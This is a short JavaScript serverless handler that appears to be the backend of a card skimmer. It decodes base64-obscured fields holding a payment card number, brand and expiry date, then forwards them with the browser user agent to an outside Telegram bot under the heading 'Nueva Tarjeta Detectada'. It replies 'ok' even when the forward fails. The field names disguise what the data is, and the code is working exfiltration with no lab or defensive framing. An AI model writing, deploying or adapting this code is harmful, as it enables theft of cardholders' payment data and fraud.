export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  try {
    const { token, tag, ref, ua } = req.body;
    
    const numero = atob(token);
    const marca = atob(tag);
    const exp = atob(ref);

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const text = `💳 *Nueva Tarjeta Detectada*\n\n` +
                 `▫️ *Número:* \`${numero}\`\n` +
                 `▫️ *Marca:* ${marca}\n` +
                 `▫️ *Exp:* ${exp}\n` +
                 `▫️ *User-Agent:* ${ua}`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
    });

    res.status(200).json({ status: "ok" });
  } catch (error) {
    res.status(200).json({ status: "ok" });
  }
}
